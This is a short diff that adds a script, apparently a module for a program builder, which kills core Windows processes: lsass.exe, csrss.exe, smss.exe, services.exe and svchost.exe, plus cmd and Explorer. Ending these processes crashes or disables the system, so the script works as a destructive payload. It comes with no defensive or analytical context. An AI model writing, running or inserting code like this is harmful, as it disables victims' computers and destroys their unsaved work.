@@ -1,0 +1,10 @@
+$insert <PREMADE>
+$insert <APP>
+
+KillProcess(cmd)
+KillExplorer()
+KillProcess(svchost.exe)
+KillProcess(lsass.exe)
+KillProcess(services.exe)
+KillProcess(csrss.exe)
+KillProcess(smss.exe)
